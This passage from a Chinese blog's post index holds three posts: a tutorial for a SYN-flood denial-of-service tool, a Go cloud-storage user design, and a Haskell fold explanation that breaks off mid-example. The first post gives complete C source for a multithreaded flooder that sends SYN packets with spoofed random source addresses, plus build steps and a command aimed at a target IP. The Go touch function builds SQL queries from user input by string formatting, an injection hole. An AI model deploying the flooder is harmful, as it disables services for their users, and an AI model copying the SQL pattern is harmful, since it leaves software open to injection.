地址，并向服务器发送 SYN，消耗服务器带宽和 CPU 资源。攻击效果取决于参与攻击的肉鸡数量、网络状况、受攻击方的防范能力。 Libnet 环境配置工具基于 Libnet 编写，Windows下的环境配置较复杂，英文版配置说明可参考托管在 GitHub 上的 README。具体配置如下： 从这里下载 LibNET 源代码，从这里下载 WinPcap 的安装包。之后，从这里下载 WpdPack 源代码。 假设你将 LibNET 源代码包解压到 E:\\libnet-1.2-rc3，将 WpdPack 包解压到 E:\\WpdPack。E:\\libnet-1.2-rc3\\libnet 下有一个文件夹 win32。你需要使用该目录下的代码建立一个 VS 工程。 配置这个工程：在 E:\\libnet-1.2-rc3\\libnet 和 E:\\WpdPack 下均有一个名为 include 的文件夹，如果你解压的位置和我上一步教程中相同，则这两个文件夹的路径分别为 E:\\libnet-1.2-rc3\\libnet\\include 和 E:\\WpdPack\\include。 将这两个路径添加到工程的 VC++ Include 目录。 将 WpdPack 的 Lib 目录添加到工程的 VC++ Lib 目录，这里是 E:\\WpdPack\\Lib. 编辑 E:\\libnet-1.2-rc3\\libnet\\win32 下的 in_systm.h，在其末尾添加 123typedef char int8_t;typedef short int16_t;typedef int int32_t; 现在你可以生成解决方案，如果生成成功，你将在 E:\\libnet-1.2-rc3\\libnet\\win32\\Debug 下生成 Libnet.dll 和 Libnet.lib。将它们复制到 C:\\Windows\\System32 和 C:\\Windows\\SysWOW64。至此，LibNET 环境配置完成。 工程环境配置 新建一个 VS 工程，目前工程为空。你可以从我托管在 GitHub 上的 仓库 下载源代码：SYNFlood.cpp 和 wingetopt.h。 设置工程：将 E:\\libnet-1.2-rc3\\libnet\\include、E:\\libnet-1.2-rc3\\libnet\\src、E:\\libnet-1.2-rc3\\libnet\\include\\libnet、E:\\WpdPack\\Include、E:\\WpdPack\\Include\\pcap 添加到工程的 VC++ 目录。 添加 E:\\WpdPack\\Lib、E:\\WpdPack\\Lib\\x64、E:\\libnet-1.2-rc3\\libnet\\win32\\Debug 添加到工程的 VC++ 链接目录。 在工程的链接器输入附加项中添加 libnet.lib。 将 E:\\libnet-1.2-rc3\\libnet\\win32\\Debug 添加到链接器附加目录。 生成可执行文件。 头文件和宏定义工程使用到的头文件、宏定义、全局变量和结构体定义如下，其中： wingetopt.h 是为 Windows 平台编写的 POSIX 系统下的 getopt.h libnet_timersub 宏用于延时 gettimeofday 是模仿 POSIX 系统下的 gettimeofday 函数编写的 Windows 版本 usage 生成提示信息 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;sys/utime.h&gt;#include &lt;libnet.h&gt;#include \"wingetopt.h\"#include &lt;windows.h&gt;#include &lt;process.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;pcap.h&gt;#pragma pack (1)#pragma comment(lib,\"wpcap.lib\")#pragma comment(lib,\"ws2_32.lib\")#define PCAP_OPENFLAG_PROMISCUOUS 1char errbuf[PCAP_ERRBUF_SIZE];char name[1001];#define libnet_timersub(tvp, uvp, vvp) \\do &#123; \\ (vvp)-&gt;tv_sec = (tvp)-&gt;tv_sec - (uvp)-&gt;tv_sec; \\ (vvp)-&gt;tv_usec = (tvp)-&gt;tv_usec - (uvp)-&gt;tv_usec; \\ if ((vvp)-&gt;tv_usec &lt; 0) &#123; \\ (vvp)-&gt;tv_sec--; \\ (vvp)-&gt;tv_usec += 1000000; \\ &#125; \\&#125; while (0)u_long dst_ip = 0;u_short dst_prt = 0;int speed = 0;struct t_pack&#123; struct libnet_ipv4_hdr ip; struct libnet_tcp_hdr tcp;&#125;;int gettimeofday(struct timeval * tp, struct timezone * tzp)&#123; static const uint64_t EPOCH = ((uint64_t)116444736000000000ULL); SYSTEMTIME system_time; FILETIME file_time; uint64_t time; GetSystemTime(&amp;system_time); SystemTimeToFileTime(&amp;system_time, &amp;file_time); time = ((uint64_t)file_time.dwLowDateTime); time += ((uint64_t)file_time.dwHighDateTime) &lt;&lt; 32; tp-&gt;tv_sec = (long)((time - EPOCH) / 10000000L); tp-&gt;tv_usec = (long)(system_time.wMilliseconds * 1000); return 0;&#125;void usage(char *nomenclature)&#123; fprintf(stderr, \"\\nusage: %s -t [-s -p]\\n\" \"\\t-t target (ip.address.port: 192.168.1.193.80)\\n\" \"\\t-s number of packets to send per second (defaults to max speed)\\n\" \"\\t-p number of threads to send packets (defaults to 1)\\n\" , nomenclature);&#125; 选择网卡函数 select_adapter 用于选择发送 SYN 数据包的网卡，它将列出检测到的所有网卡并由用户输入选择。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849int select_adapter(pcap_t **handle) &#123; pcap_if_t *alldevs; pcap_if_t *d; int inum, i=0; if(pcap_findalldevs(&amp;alldevs, errbuf) == -1)&#123; fprintf(stderr,\"Error in pcap_findalldevs: %s\\n\", errbuf); exit(1); &#125; for(d = alldevs; d; d = d-&gt;next)&#123; printf(\"%d. %s\", ++i, d-&gt;name); if (d-&gt;description) printf(\" (%s)\\n\", d-&gt;description); else printf(\" (No description available)\\n\"); &#125; if(!i)&#123; printf(\"\\nNo interfaces found! Make sure WinPcap is installed.\\n\"); return -1; &#125; printf(\"Choose the interface (1-%d):\",i); scanf_s(\"%d\", &amp;inum); if(inum &lt; 1 || inum &gt; i)&#123; printf(\"\\nInterface number out of range.\\n\"); pcap_freealldevs(alldevs); return -1; &#125; /* Jump to the selected adapter */ for(d = alldevs, i = 0; i &lt; inum-1 ; d = d-&gt;next, i++); if ((*handle= pcap_open_live( d-&gt;name, // name of the device 65536, // portion of the packet to capture. // 65536 grants that the whole packet will be captured on all the MACs. PCAP_OPENFLAG_PROMISCUOUS, // promiscuous mode (nonzero means promiscuous) 1000, // read timeout errbuf // error buffer )) == NULL)&#123; fprintf(stderr,\"\\nUnable to open the adapter. %s is not supported by WinPcap\\n\", d-&gt;name); pcap_freealldevs(alldevs); return -1; &#125; strcpy_s(name,d-&gt;name); printf(\"Successfully Open the adapter &lt;%s&gt; \\n\", d-&gt;description); return TRUE;&#125; 发送线程函数此函数用于构造并发送 SYN 数据包： 根据用户指定参数生成的 speed 的不同，默认全速发送（speed = 0），否则根据 speed 的值在每次发送后延时 构造的 SYN 包中，IP 包中的源 IP 和 TCP 包头中的源端口均为随机数 libnet_write 用于发送数据包 l 是 libnet 中的上下文 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104unsigned int __stdcall send_syn(PVOID argv)&#123; struct timeval r; struct timeval s; struct timeval e; libnet_ptag_t t = LIBNET_PTAG_INITIALIZER; u_int32_t src_ip; char errbuf[LIBNET_ERRBUF_SIZE]; u_short src_prt; libnet_t *l = libnet_init( LIBNET_RAW4, /* injection type */ name, /* network interface */ errbuf); /* errbuf */ if (l == NULL)&#123; fprintf(stderr, \"libnet_init() failed: %s\", errbuf); return 0; &#125; libnet_seed_prand(l); if(speed == 0)&#123; while (1)&#123; t = libnet_build_tcp( src_prt = libnet_get_prand(LIBNET_PRu16), dst_prt, libnet_get_prand(LIBNET_PRu32), // sequence number 0, // acknowledgement num TH_SYN, libnet_get_prand(LIBNET_PRu16), // window size 0, 0, LIBNET_TCP_H, NULL, 0, l, 0); libnet_build_ipv4( LIBNET_TCP_H + LIBNET_IPV4_H, 0, libnet_get_prand(LIBNET_PRu16), 0, libnet_get_prand(LIBNET_PR8), IPPROTO_TCP, 0, src_ip = libnet_get_prand(LIBNET_PRu32), dst_ip, NULL, 0, l, 0); int c = libnet_write(l); if (c == -1)&#123; fprintf(stderr, \"libnet_write: %s\\n\", libnet_geterror(l)); &#125; libnet_clear_packet(l); &#125; &#125; else &#123; while (1)&#123; gettimeofday(&amp;s, NULL); for(int i = 0; i &lt; speed; i++)&#123; t = libnet_build_tcp( src_prt = libnet_get_prand(LIBNET_PRu16), dst_prt, libnet_get_prand(LIBNET_PRu32), // sequence number 0, // acknowledgement num TH_SYN, libnet_get_prand(LIBNET_PRu16), // window size 0, 0, LIBNET_TCP_H, NULL, 0, l, t); libnet_build_ipv4( LIBNET_TCP_H + LIBNET_IPV4_H, 0, libnet_get_prand(LIBNET_PRu16), 0, libnet_get_prand(LIBNET_PR8), IPPROTO_TCP, 0, src_ip = libnet_get_prand(LIBNET_PRu32), dst_ip, NULL, 0, l, 0); int c = libnet_write(l); if (c == -1) &#123; fprintf(stderr, \"libnet_write: %s\\n\", libnet_geterror(l)); &#125; libnet_clear_packet(l); &#125; gettimeofday(&amp;e, NULL); libnet_timersub(&amp;e, &amp;s, &amp;r); if (r.tv_sec &lt; 1) &#123; Sleep((1000000 - r.tv_usec)/1000); &#125; &#125; &#125; libnet_destroy(l); return 1;&#125; 主函数主函数主要处理用户输入参数并将其格式化，之后根据用户输入参数启动发送线程，线程启动间隔 1s，整个攻击默认持续 12 分钟结束，可以通过 CTRL+C 结束。getopt 按照 ip.port 的格式对输入参数 -t 做划分，例如用户指定攻击的目标 IP 为 10.3.8.211，端口 80，则输入参数 -t 对应 10.3.8.211.80。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061int main(int argc, char **argv) &#123; libnet_t *l; char *cp; char errbuf[LIBNET_ERRBUF_SIZE]; int c, whole_speed = 0, thread_num = 1; pcap_t *handle = 0; select_adapter(&amp;handle); l = libnet_init( LIBNET_RAW4, /* injection type */ name, /* network interface */ errbuf); /* error buffer */ if (l == NULL)&#123; fprintf(stderr, \"libnet_init() failed: %s\", errbuf); exit(EXIT_FAILURE); &#125; while((c = getopt(argc, argv, \"t:s:p:\")) != EOF)&#123; switch (c) &#123; case 't': if (!(cp = strrchr(optarg, '.')))&#123; usage(argv[0]); exit(EXIT_FAILURE); &#125; *cp++ = 0; dst_prt = (u_short)atoi(cp); if ((dst_ip = libnet_name2addr4(l, optarg, 1)) == -1)&#123; fprintf(stderr, \"Bad IP address: %s\\n\", optarg); exit(EXIT_FAILURE); &#125; break; case 's': whole_speed = atoi(optarg); break; case 'p': thread_num = atoi(optarg); break; default: usage(argv[0]); exit(EXIT_FAILURE); &#125; &#125; libnet_destroy(l); if (!dst_prt || !dst_ip)&#123; usage(argv[0]); exit(EXIT_FAILURE); &#125; speed = whole_speed / thread_num; for(int i = 0; i &lt; thread_num; i++)&#123; HANDLE handle = (HANDLE)_beginthreadex(NULL, 0, send_syn, NULL, 0, NULL); if (handle &lt; 0)&#123; printf(\"can't create send_syn thread!\\n\"); &#125; Sleep(1000); &#125; Sleep(1200*1000);&#125; 运行生成程序支持三个参数： -t：设置目标的 IP 地址和端口 -s：设置每个线程每秒钟发送的 SYN 数据包数量，若未指定则默认为 0，即全速发送 -p：设置同时发送 SYN 数据包的线程数 例如，同时启动 4 个攻击线程，每个线程每秒发送 200 个伪造 SYN 数据包，攻击目标为 10.3.8.211:80：synFlood.exe -t 10.3.8.211.80 -s 200 -p 4。 启动程序并开始发送后，使用 wireshark 可以捕获到伪造的 SYN 数据包，其中攻击我的 CVM 截图如下，因为 CVM 供应商提供了 DDOS 防护措施，CVM 上的 Web 服务器未收到明显影响。 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2016/11/20/ddos-syn-attack/) 、作者信息（Forec）和本声明。","categories":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}],"tags":[{"name":"OS","slug":"OS","permalink":"http://forec.github.io/tags/OS/"},{"name":"Safety","slug":"Safety","permalink":"http://forec.github.io/tags/Safety/"},{"name":"线程","slug":"线程","permalink":"http://forec.github.io/tags/线程/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}]},{"title":"顶点云（应用）用户结构设计","slug":"zenith-cloud-5","date":"2016-11-19T15:20:42.000Z","updated":"2016-12-23T17:21:18.000Z","comments":true,"path":"2016/11/19/zenith-cloud-5/","link":"","permalink":"http://forec.github.io/2016/11/19/zenith-cloud-5/","excerpt":"介绍顶点云应用程序服务器中用户 ADT 的设计、结构，实现用户模型框架。","text":"介绍顶点云应用程序服务器中用户 ADT 的设计、结构，实现用户模型框架。 用户 ADT 设计 在 项目简介 中，我们已经设计好了数据库中用户表结构，下面设计保存在系统内存中的活动用户的数据结构。 保存在系统内存的用户数据结构中应当包括如下信息，以使系统能够区分用户状态、验证用户身份、接收用户指令、给予用户反馈： 用户 Id：数据库中用户表的主键，自增，可区分用户身份，可用于检索用户 用户名：用于区分用户身份，方便用户记忆，在用户表中不可重复 接收指令模块：用于接收用户发送的指令 推送消息模块：用于向用户推送消息 执行模块：用于执行接收到的合法命令 其它：包括其它需要存储的零碎信息 用户接口分析：用户 ADT 需要能提供至少如下大致的接口（参数可能和最终实现的代码不同，但函数意义相同）。 GetUsername() string：获取用户用户名 GetId() int64：获取用户 Id DealWithRequests()：接收、分析并处理用户发送的指令 DealWithTransmission()：处理用户请求的文件传输 Logout()：登出用户 在工程目录下新建 cstruct 目录，要编写的模块名为 cstruct。在该目录下创建文件 cuser.go， 以下代码均在该文件中编辑。 用户数据结构 用户结构需要保存自己的 Id、用户名。 用户结构需要保存至少两个活动连接，根据最初设计的协议，其中一个用来接收用户发送的文本请求指令并反馈给用户可用文本表达的信息，另一个用来向用户推送请求。 根据协议，文件传输请求需要启动一个新的活动连接，该连接的建立需要验证用户的 token ，因此用户数据结构需要保存登录时使用的 token。 用户还需要保存当前活动的文件传输连接。 综上，用户 struct 应当维持以下基本内容： id：int64 类型 username：string 类型，用户名 listen：命令传输、文本传输连接，Transmitable 类型 infos：向用户推送信息的连接，Transmitable 类型 token：用户登录时保存的 token 值，string 类型 worklist []Transmitable：用户当前的文件传输连接列表 拓展基本用户接口，增加了如下方法： GetToken() string ：获取用户登录时保存的 token 值（此方法破坏了数据的隐藏性，应当使用如 TokenVerify(token_to_check) 这样的函数来验证） SetToken(string) bool：为用户设置新 token 值，此方法在用户登录时调用 SetListener(Transmitable) bool：为用户设置命令、文本交互连接 SetInfos(Transmitable) bool：为用户设置消息推送连接 AddTransmit(Transmitable) bool：用户启动一个新的文件传输连接 RemoveTransmit(Transmitable) bool：用户移除一个文件传输连接 用户接口实现 以上接口均可根据函数名称获知其含义，实现均非常简单，其中 Set() 和 Get() 系列函数和普通的获取、设置值的函数相似，不在此展示。 Logout() 实现如下，断开所有活动连接： 1234567891011// cuser.gofunc (u *cuser) Logout() &#123; if u.listen != nil &#123; u.listen.Destroy() &#125; for _, ut := range u.worklist &#123; if ut != nil &#123; ut.Destroy() &#125; &#125;&#125; AddTransmit(Transmitable) bool 实现如下，向用户的 worklist 中添加一个活动连接，以下代码中将 transmit 包导入为 trans，因此参数为 trans.Transmitable 类型。函数实现中 AppendTransmitable([]Transmitable, Transmitable) 的功能是向传输列表中附加一项，该函数将在 ulist.go 文件中实现： 123456789// cuser.gofunc (u *cuser) AddTransmit(t trans.Transmitable) bool &#123; if u.worklist == nil &#123; u.worklist = make([]trans.Transmitable, 0, 2) &#125; tempLen := len(u.worklist) u.worklist = AppendTransmitable(u.worklist, t) return len(u.worklist) != tempLen&#125; RemoveTransmit(Transmitable) bool 实现如下，它将参数和用户活动连接挨个比对： 1234567891011// cuser.gofunc (u *cuser) RemoveTransmit(t trans.Transmitable) bool &#123; for i, ut := range u.worklist &#123; if ut == t &#123; u.worklist = append(u.worklist[:i], u.worklist[i+1:]...) t.Destroy() return true &#125; &#125; return false&#125; DealWithRequests() 的实现需要根据设计的命令协议，创建一个 cuser_operation.go 文件，将该函数保存在该文件中。 处理请求 DealWithRequests() 函数根据协议设计的命令实现，主体由 switch 选择命令对应的行为，switch 由 for 循环包裹，每次执行完命令后，由 RecvBytes() 阻塞等待用户发送新命令。以下实现的 DealWithRequests(*sql.DB) 包含了 rm、cp、mv、ls、fork、touch、chmod 以及 send 指令的选择和实现，对应这些命令的函数将分别编写。因为需要对数据库做增删查改，所以 DealWithRequests() 函数传入了一个数据库对象指针作为参数。 此处的实现破坏了内部细节的不可见性，数据库不应由用户 ADT 操作，可以采用 Proxy 模式为用户对数据库操作的请求做转发 ，但当初并未考虑到，重构代码时会修正采用的设计模式。 12345678910111213141516171819202122232425262728293031323334// cuser_operation.gopackage cstructfunc (u *cuser) DealWithRequests(db *sql.DB) &#123; u.curpath = \"/\" fmt.Println(u.username + \" Start deal with args\") for &#123; recvB, err := u.listen.RecvBytes() if err != nil &#123; return &#125; command := string(recvB) fmt.Println(command) switch &#123; case len(command) &gt;= 2 &amp;&amp; strings.ToUpper(command[:2]) == \"RM\": u.rm(db, command) case len(command) &gt;= 2 &amp;&amp; strings.ToUpper(command[:2]) == \"CP\": u.cp(db, command) case len(command) &gt;= 2 &amp;&amp; strings.ToUpper(command[:2]) == \"MV\": u.mv(db, command) case len(command) &gt;= 2 &amp;&amp; strings.ToUpper(command[:2]) == \"LS\": u.ls(db, command) case len(command) &gt;= 4 &amp;&amp; strings.ToUpper(command[:4]) == \"SEND\": u.send(db, command) case len(command) &gt;= 4 &amp;&amp; strings.ToUpper(command[:4]) == \"FORK\": u.fork(db, command) case len(command) &gt;= 5 &amp;&amp; strings.ToUpper(command[:5]) == \"TOUCH\": u.touch(db, command) case len(command) &gt;= 5 &amp;&amp; strings.ToUpper(command[:5]) == \"CHMOD\": u.chmod(db, command) default: u.listen.SendBytes([]byte(\"Invalid Command\")) &#125; &#125;&#125; 对于 DealWithRequests(db *sql.DB) 中可选的每个指令执行函数，用户 ADT 需要将它们分别实现为私有方法。例如，根据此前设计的用户功能，我们要实现的顶点云的 touch 函数实现如下，注意， 此函数的实现是非常失败的 ！事实上，要实现的每个指令执行函数都非常复杂， touch 函数仅仅是这些函数中最简单的一个。因为指令函数需要通过对数据库的修改实现指令逻辑意义，并且不断检查是否有错误发生，所以 频繁出现的 nil == 验证扰乱了代码的正常逻辑 。一个可行的解决方案是， 此类函数运行时错误通过异常来触发，在函数执行结束后由 defer 指令统一 recover 并做出对应反馈 ，这一点在重构时应当涉及。可以看到，touch 函数的执行代码中，大部分都是涉及数据库的查询、更新操作，每次查询、更新都需要检查是否反馈了错误，所以这部分业务逻辑非常繁琐。此外，touch 代码中使用到了 goto 关键字，因此所有的变量都需要在 goto 语句之前声明，这也 破坏了就近原则 。作为一个设计失败的初版代码，放置在这里对我自己起到警醒作用，希望对后来者也能避免类似的错误： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667// cuser_operation.gotype path_name struct &#123; u_path string u_name string&#125;func (u *cuser) touch(db *sql.DB, command string) &#123; var valid bool = true var execString string var subpaths []path_name var queryRow *sql.Row var isdir, recordCount int var err error args := generateArgs(command, 4) if args == nil &#123; fmt.Println(\"args format wrong\") valid = false goto TOUCH_VERIFY &#125; isdir, err = strconv.Atoi(args[3]) if err != nil || strings.ToUpper(args[0]) != \"TOUCH\" || !isFilenameValid(args[1]) || !isPathFormatValid(args[2]) || isdir != 0 &amp;&amp; isdir != 1 &#123; if err != nil &#123; fmt.Println(err.Error()) &#125; valid = false goto TOUCH_VERIFY &#125; subpaths = generateSubpaths(args[2]) for _, subpath := range subpaths &#123; queryRow = db.QueryRow(fmt.Sprintf(`select count(*) from ufile where ownerid=%d and filename='%s' and path='%s' and isdir=1`, u.id, subpath.u_name, subpath.u_path)) if queryRow == nil &#123; valid = false goto TOUCH_VERIFY &#125; err = queryRow.Scan(&amp;recordCount) if err != nil &#123; fmt.Println(err.Error()) valid = false goto TOUCH_VERIFY &#125; if recordCount &lt;= 0 &#123; _, err = db.Exec(fmt.Sprintf(`insert into ufile values(null, %d, -1, '%s', '', '%s', 0, 0, '%s', 1, '', 1)`, u.id, subpath.u_path, time.Now().Format(\"2006-01-02 15:04:05\"), subpath.u_name)) if err != nil &#123; fmt.Println(err.Error()) valid = false &#125; &#125; &#125; execString = fmt.Sprintf(`insert into ufile values(null, %d, -1, '%s', '', '%s', 0, 0, '%s', 1, '', %d)`, u.id, args[2], time.Now().Format(\"2006-01-02 15:04:05\"), args[1], isdir) fmt.Println(execString) _, err = db.Exec(execString) if err != nil &#123; fmt.Println(err.Error()) valid = false &#125;TOUCH_VERIFY: if !valid &#123; u.listen.SendBytes(auth.Int64ToBytes(int64(400))) &#125; else &#123; u.listen.SendBytes(auth.Int64ToBytes(int64(200))) &#125;&#125; 同样，当系统需要为用户添加新指令时，需要修改用户 ADT 中的 DealWithRequsts() 共有方法。这也破坏了 对功能扩展开放，对修改封闭 的原则，一个可行的替代方法是 使用 Strategy 模式封装指令，由其代理用户 ADT 中对指令的执行方案 。我们可以创建一个表驱动的 Strategy 基类，当添加新方法时，向 Strategy 类注册该方法并在具体子类中实现。 用户结构的列表操作 此前在 AddTransmit() 函数中使用到的 AppendTransmitable([]Transmitable, Transmitable) 是 ulist.go 文件中的函数，该文件专门用来处理涉及 cstruct 中各类结构的列表操作。其中 AppendTransmitable 函数实现如下，该函数判断当前活动列表是否已经超出设置的最大长度，若仍可加入，则扩展列表： 123456789// ulist.gofunc AppendTransmitable(slice []trans.Transmitable, data ...trans.Transmitable) []trans.Transmitable &#123; if len(slice)+len(data) &gt;= conf.MAXTRANSMITTER &#123; slice = append(slice, data[:conf.MAXTRANSMITTER-len(slice)]...) &#125; else &#123; slice = append(slice, data...) &#125; return slice&#125; ulist.go 中还存在一个 AppendUser() 函数，该函数用于向一个用户列表附加新用户，可以猜测到，该函数将在服务器处理登录事件时使用。 12345678910111213// ulist.gofunc AppendUser(slice []User, data ...User) []User &#123; m := len(slice) n := m + len(data) if n &gt; cap(slice) &#123; newSlice := make([]User, (n+1)*2) copy(newSlice, slice) slice = newSlice &#125; slice = slice[0:n] copy(slice[m:n], data) return slice&#125; 服务器需要根据用户名检索用户是否已登录，使用 UserIndexByName 可从一个用户列表中选择某一用户名的用户，该函数实现如下： 123456789// ulist.gofunc UserIndexByName(slice []User, name string) User &#123; for _, uc := range slice &#123; if uc.GetUsername() == name &#123; return uc &#125; &#125; return nil&#125; 专栏目录：顶点云设计与实现此专栏的上一篇文章：顶点云（应用）传输、认证单元测试此专栏的下一篇文章：顶点云（应用）服务器逻辑实现 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2016/11/19/zenith-cloud-5/) 、作者信息（Forec）和本声明。","categories":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://forec.github.io/tags/Golang/"},{"name":"云存储","slug":"云存储","permalink":"http://forec.github.io/tags/云存储/"},{"name":"线程","slug":"线程","permalink":"http://forec.github.io/tags/线程/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}]},{"title":"Haskell 的 fold 系列","slug":"haskell-fold","date":"2016-11-18T07:10:11.000Z","updated":"2016-11-18T12:20:42.000Z","comments":true,"path":"2016/11/18/haskell-fold/","link":"","permalink":"http://forec.github.io/2016/11/18/haskell-fold/","excerpt":"分析 Haskell 中 fold 系列函数。","text":"分析 Haskell 中 fold 系列函数。 一年前刚接触 Haskell 时，以及半年前学习 sicp 时，fold 之间的转化和区别就曾让我纠结过一段时间。现在重新来看，有些概念还是模糊。所以把主要的区别记录下来以供日后查阅。 相关链接： Wikipedia上关于 fold 的解释)：包含了最基本的解释和形象的图示 Haskell Wiki上对 fold 系列函数的解释：包含了对 foldl、foldr和foldl&#39; 的对比、分析，下面使用的例子即从此而来 Haskell Wiki上 foldl 和 foldr 之间的转换：包含了 foldl 和 foldr 之间转换的理解、应用 Data.Foldable 中的 foldl 和 foldr 均为非严格求值（惰性求值），最明显的差别在折叠方向不同，一个从左到右，一个从右到左。其次，foldl 的形式是尾递归，而 foldr 则需要在每折叠一个元素时在栈中重新开辟一块空间以进入下一层次的递归。因此 foldl 较 foldr 效率更高，但二者处理的列表长度均有限制（如果求值中不出现短路的情况）。 无限长列表处理另一个显式的不同在于，foldr 能够处理无限列表，这是因为 foldr 在展开过程中可能出现表达式短路，例如下面的例子中，foldr 使用初值 True 对一个无限长的、元素均为 False 的列表求与，将立刻得到 False，因为其展开式为 a0 &amp;&amp; (a1 &amp;&amp; ( ... &amp;&amp; (a. &amp;&amp; True)))，虽然整个列表展开式是无穷的，但因为最外层 &amp;&amp; 表达式的第一个操作数是 False，与操作表达式短路，因此运算随之结束。 12foldr (&amp;&amp;) True (repeat False)False &amp;&amp; (False &amp;&amp; (False &amp;&amp; (... &amp;&amp; (False &amp;&amp; True) ... ))) 而使用 foldl 时，其展开过程如下。整个展开式无穷，而最外层的 &amp;&amp; 表达式的第一个操作数是一个子式，也是一个无穷的展开式，要求 foldl 表达式结果必须先求得子式的值，这个过程将永不会结束，也无法利用短路特性。 12foldl (&amp;&amp;) True (repeat False)((...(True &amp;&amp; False) &amp;&amp; False) &amp;&amp; ...) 所以，foldr 能够处理无限长列表的原因在于，它从右向左折叠，展开式方向从左向右，所以能够利用某些表达式的短路特性。 二者处理长列表对比在折叠操作无短路特性的情况下，两者处理的列表长度均有限。尽管 foldl 采取了尾递归，但由于 Haskell 默认使用惰性求值，所以和 foldr 一样，都会产生 *** Exception: stack overflow。 下面的例子来自上面的 Haskell Wiki。 foldr 处理 foldr (+) 0 [1..1000000] 的过程展开如下。因为 (+) 是严格求值符号，所以符号两边的参数都要求出才能对表达式求值。在例子中，要求 1 + (2 + (3 + (4 + (...))))，则： 1 被入栈，并对 2 + (3 + (4 + (...))) 求值； 2 被入栈，并对 3 + (4 + (...)) 求值； 3 被入栈，并对 4 + (...) 求值。当列表长度足够大时，栈满将引发栈溢出异常。 123456789101112131415161718foldr (+) 0 [1..1000000] --&gt;1 + (foldr (+) 0 [2..1000000]) --&gt;1 + (2 + (foldr (+) 0 [3..1000000])) --&gt;1 + (2 + (3 + (foldr (+) 0 [4..1000000]))) --&gt;1 + (2 + (3 + (4 + (foldr (+) 0 [5..1000000])))) --&gt;-- ...1 + (2 + (3 + (4 + (... + (999999 + (foldr (+) 0 [1000000]))...)))) --&gt;1 + (2 + (3 + (4 + (... + (999999 + (1000000 + ((foldr (+) 0 []))))...)))) --&gt;-- ...1 + (2 + (3 + (4 + (... + (999999 + (1000000 + 0))...)))) --&gt;1 + (2 + (3 + (4 + (... + (999999 + 1000000)...)))) --&gt;1 + (2 + (3 + (4 + (... + 1999999 ...)))) --&gt;-- ...1 + (2 + (3 + (4 + 500000499990))) --&gt;1 + (2 + (3 + 500000499994)) --&gt;1 + (2 + 500000499997) --&gt;1 + 500000499999 --&gt;500000500000 同样的表达式，用 foldl 解释过程如下（使用 foldl 尝试可能导致操作系统异常），因为 (+) 符号产生的整个表达式仍然不可约（即不具有短路特性，必须将最后一个元素计算后才可得出结果），所以仍然要展开整个列表。整个解释过程分三部分： 第一部分是尾递归，因为 Haskell 的惰性求值，foldl f z (x:xs) 引出的 foldl f (f z x) xs 式中，f z x 不会被立刻求值，而是以 let 方式在堆中分配一块空间存储，而堆的空间取决于所使用机器的内存，如果列表足够长，可能在这一部分就会导致程序的崩溃，因为这部分的工作就是向堆中写入大量 let 产生的数据，这些数据会占用大量的内存。 假设上一步成功执行，则堆中将充斥着 let 绑定，它们的数量和列表长度相同。在下面的例子中，表达式只剩下 z1000000。而要求 z1000000，必须求 z1000000 = z999999 + 1000000 中的 z999999。所以 1000000 入栈，并开始对 z999999 求值；之后 999999 入栈，并对 z999998 求值，以此类推。这一步和 foldr 的展开类似，只是列表展开方向上 foldl 从右到左，当列表长度足够长时，这一步将导致栈溢出，这也是为什么 foldl 对长列表做严格求值运算时，会产生 *** Exception: stack overflow 异常的原因，通常堆的空间足够大，第一步能够成功执行，而在此步，foldl 和 foldr 面临同样的困境。 假设上一步成功执行，剩下的操作就是不断地出栈、求值。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100foldl (+) 0 [1..1000000] --&gt; let z1 = 0 + 1in foldl (+) z1 [2..1000000] --&gt; let z1 = 0 + 1 z2 = z1 + 2in foldl (+) z2 [3..1000000] --&gt; let z1 = 0 + 1 z2 = z1 + 2 z3 = z2 + 3in foldl (+) z3 [4..1000000] --&gt; -- ... after many foldl steps ... let z1 = 0 + 1 z2 = z1 + 2 z3 = z2 + 3 z4 = z3 + 4 ... z999997 = z999996 + 999997 z999998 = z999997 + 999998 z999999 = z999998 + 999999in foldl (+) z999999 [1000000] --&gt; let z1 = 0 + 1 z2 = z1 + 2 z3 = z2 + 3 z4 = z3 + 4 ... z999997 = z999996 + 999997 z999998 = z999997 + 999998 z999999 = z999998 + 999999 z100000 = z999999 + 1000000in foldl (+) z1000000 [] --&gt; let z1 = 0 + 1 z2 = z1 + 2 z3 = z2 + 3 z4 = z3 + 4 ... z999997 = z999996 + 999997 z999998 = z999997 + 999998 z999999 = z999998 + 999999 z100000 = z999999 + 1000000in z1000000 --&gt; -- Now a large chain of +'s will be created: let z1 = 0 + 1 z2 = z1 + 2 z3 = z2 + 3 z4 = z3 + 4 ... z999997 = z999996 + 999997 z999998 = z999997 + 999998 z999999 = z999998 + 999999in z999999 + 1000000 --&gt; let z1 = 0 + 1 z2 = z1 + 2 z3 = z2 + 3 z4 = z3 + 4 ... z999997 = z999996 + 999997 z999998 = z999997 + 999998in (z999998 + 999999) + 1000000 --&gt; let z1 = 0 + 1 z2 = z1 + 2 z3 = z2 + 3 z4 = z3 + 4 ...in (((z999996 + 999997) + 999998) + 999999) + 1000000 --&gt; -- ...let z1 = 0 + 1 z2 = z1 + 2 z3 = z2 + 3in ((((((z3 + 4) + 5) + ...) + 999997) + 999998) + 999999) + 1000000 --&gt; let z1 = 0 + 1 z2 = z1 + 2in (((((((z2 + 3) + 4) + 5) + ...) + 999997) + 999998) + 999999) + 1000000 --&gt; let z1 = 0 + 1in ((((((((z1 + 2) + 3) + 4) + 5) + ...) + 999997) + 